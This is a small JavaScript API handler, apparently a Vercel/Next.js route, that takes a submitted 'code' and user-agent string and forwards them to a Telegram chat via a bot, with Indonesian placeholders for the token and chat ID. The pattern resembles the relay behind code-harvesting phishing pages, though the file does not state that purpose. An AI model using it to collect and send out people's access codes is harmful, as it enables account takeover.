export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, err: 'method_not_allowed' });
  }

  const { code, ua } = req.body || {};
  if (!code) return res.status(400).json({ ok: false, err: 'no_code' });

  const BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU';
  const CHAT_ID = 'ISI_CHAT_ID_KAMU';

  const msg = `🔔 Akses MyVideo\nKode: ${code}\nUA: ${ua}`;

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: 'Markdown'
      })
    });
    return res.status(200).json({ ok: true });
  } catch (err) {
    return res.status(500).json({ ok: false, err: err.message });
  }
}
